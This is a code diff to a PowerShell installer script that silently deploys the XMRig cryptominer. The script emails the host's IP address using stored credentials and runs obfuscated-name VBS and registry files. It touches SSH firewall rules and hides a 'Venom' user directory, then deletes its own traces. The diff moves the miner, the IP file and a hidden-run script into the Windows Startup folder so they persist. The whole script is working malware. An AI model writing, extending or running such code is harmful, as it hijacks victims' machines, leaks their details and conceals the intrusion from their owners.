@@ -19,6 +19,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 $wd = random_text
 $path = "$env:temp\$wd"
 $INITIALPATH = Get-Location
+$initial_dir = "C:\Users\darkd\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 
 # Read Email and Password from Files
 $email = Get-Content PkUbTvqXFIdB.txt
@@ -29,7 +30,7 @@ $InterfaceAlias = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }).Interfa
 $IP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $InterfaceAlias).IPAddress
 
 # Save IP Address to File
-$ipFile = "$INITIALPATH\ip.txt"
+$ipFile = "$initial_dir\ip.txt"
 $IP | Out-File -FilePath $ipFile
 
 # Create Configuration File
@@ -56,12 +57,10 @@ Send-MailMessage `
     -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $plainPassword -AsPlainText -Force))
 
 # Copy and Remove Configuration File
-#Copy-Item -Path $ipFile -Destination $path
 Remove-Item -Path $configfile
 
 # Create and Change to Working Directory
 mkdir $path
-
 cd $path
 
 # Download Files
@@ -81,7 +80,7 @@ Get-NetFirewallRule -Name *ssh*
 & "./FoRAUwtxKkSB.vbs"
 
 # Move RunHidden.vbs and Pause
-Move-Item -Path "$path\ZDaFvwjOosKx.vbs" -Destination $INITIALPATH
+Move-Item -Path "$path\ZDaFvwjOosKx.vbs" -Destination $initial_dir
 Start-Sleep -Seconds 30
 
 # Create New Directory and Change to It
@@ -91,11 +90,11 @@ $currentDir = $Pwd
 
 # Download and Extract XMRig
 Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -OutFile "xmrig-6.22.2-msvc-win64.zip"
-Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath "$currentDir"
+Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath "$initial_dir"
 
 # Replace XMRig Configuration File
 $newConfigPath = "$path\config.json"
-$targetConfigPath = "$currentDir\xmrig-6.22.2\config.json"
+$targetConfigPath = "$initial_dir\xmrig-6.22.2\config.json"
 if (Test-Path -Path $newConfigPath) {
     Copy-Item -Path $newConfigPath -Destination $targetConfigPath -Force
     Write-Output "Config.json file has been replaced successfully."
@@ -104,9 +103,9 @@ if (Test-Path -Path $newConfigPath) {
 }
 
 # Define Paths
-$ipFile = "$path\ip.txt"
-$xmrPath = "$currentDir\xmrig.exe"
-$configPath = "$currentDir\config.json"
+$ipFile = "$initial_dir\ip.txt"
+$xmrPath = "$initial_dir\xmrig.exe"
+$configPath = "$initial_dir\config.json"
 
 # Send Email with Rig Status
 Send-MailMessage `
@@ -167,7 +166,7 @@ Send-MailMessage `
     -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $password -AsPlainText -Force))
 
 # Clean Up
-Remove-Item -Path $ipFile
+Remove-Item -Path "$initial_dir\ip.txt"
 
 # Hide Venom User Directory
 Set-Location -Path 'C:\Users'
@@ -185,14 +184,15 @@ Remove-Item -Path "config.json"
 Remove-Item -Path "QyjAaZDBbNPk.reg"
 Remove-Item -Path "FoRAUwtxKkSB.vbs"
 
-cd $INITIALPATH
+cd $initial_dir
 Start-Process -FilePath "cscript.exe" -ArgumentList "ZDaFvwjOosKx.vbs"
 
 # Pause for 200 seconds
 Start-Sleep -Seconds 200
 
-# Delete Installer Script
-Remove-Item -Path "installer.ps1"
+# Delete Installer Script and IP File
+Remove-Item -Path "$initial_dir\installer.ps1"
+Remove-Item -Path "$initial_dir\ip.txt"
 
 # Final Cleanup
 cd $INITIALPATH
